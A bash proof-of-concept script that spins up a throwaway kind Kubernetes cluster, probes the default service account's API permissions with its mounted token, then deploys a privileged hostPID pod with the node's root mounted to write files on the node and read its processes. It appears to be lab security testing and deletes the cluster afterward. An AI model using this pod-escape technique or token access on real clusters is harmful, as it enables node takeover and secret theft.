#!/usr/bin/env bash
# kind cluster: Pod->Node escape surface probes. Cluster is deleted at the end.
set -u
mkdir -p reports
R=reports/poc-k8s-report.txt
exec > >(tee -a "$R") 2>&1

echo "== toolchain"
kind version
kubectl version --client 2>/dev/null | head -2 || true

echo "== create kind cluster"
if ! kind create cluster --name esc-lab --wait 180s; then
  echo "kind create FAILED"; exit 1
fi

echo "== [k1] default SA real permission boundary: in-pod SelfSubjectRulesReview"
kubectl run probe --image=alpine:3.19 --restart=Never -- sleep 600 >/dev/null
kubectl wait --for=condition=Ready pod/probe --timeout=120s
kubectl exec probe -- sh -c '
T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
wget --no-check-certificate -q -O /dev/stdout --header="Authorization: Bearer $T" --header="Content-Type: application/json" --post-data="{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"default\"}}" https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews 2>&1 | head -c 1500
echo
'
echo "== [k2] default SA API access codes: in-pod busybox wget channel"
kubectl exec probe -- sh -c '
T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
echo "GET pods:";     wget --no-check-certificate -q -O /dev/null -S --header="Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/namespaces/default/pods    2>&1 | grep -E "HTTP/"
echo "GET secrets:";  wget --no-check-certificate -q -O /dev/null -S --header="Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/namespaces/default/secrets  2>&1 | grep -E "HTTP/"
'
echo "== [k2-host] host-side channel with kubectl-created SA token (cross-check)"
APISERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
ST=$(kubectl create token default -n default 2>/dev/null)
curl -sk -o /dev/null -w "GET pods:    %{http_code}\n" -H "Authorization: Bearer $ST" "$APISERVER/api/v1/namespaces/default/pods"
curl -sk -o /dev/null -w "GET secrets: %{http_code}\n" -H "Authorization: Bearer $ST" "$APISERVER/api/v1/namespaces/default/secrets"

echo "== [k3] privileged + hostPID + hostPath pod (Pod->Node escape)"
cat <<'EOF' | kubectl apply -f - >/dev/null
apiVersion: v1
kind: Pod
metadata:
  name: esc-priv
spec:
  hostPID: true
  containers:
  - name: c
    image: alpine:3.19
    command: ["sleep", "600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: hostroot
      mountPath: /host
  volumes:
  - name: hostroot
    hostPath:
      path: /
      type: Directory
EOF
kubectl wait --for=condition=Ready pod/esc-priv --timeout=120s
echo "-- node fs via hostPath (head):"
kubectl exec esc-priv -- ls /host 2>/dev/null | head -15
echo "-- write marker to node fs via hostPath:"
kubectl exec esc-priv -- sh -c 'echo "pod-escape-marker $(date -u +%FT%TZ)" > /host/tmp/k8s-pod-escape-marker && cat /host/tmp/k8s-pod-escape-marker'
echo "-- authoritative verify from node itself (kind node container):"
docker exec esc-lab-control-plane cat /tmp/k8s-pod-escape-marker 2>/dev/null || echo "MISSING"
echo "-- hostPID: node processes visible inside pod (head):"
kubectl exec esc-priv -- sh -c 'ps aux 2>/dev/null | head -12 || ls /host/proc | grep -E "^[0-9]+$" | head -12'
echo "-- node identity via /host/proc:"
kubectl exec esc-priv -- sh -c 'cat /host/proc/cmdline 2>/dev/null | head -c 200; echo'

echo "== cleanup: delete kind cluster (no dirty resources)"
kind delete cluster --name esc-lab
echo "== done"
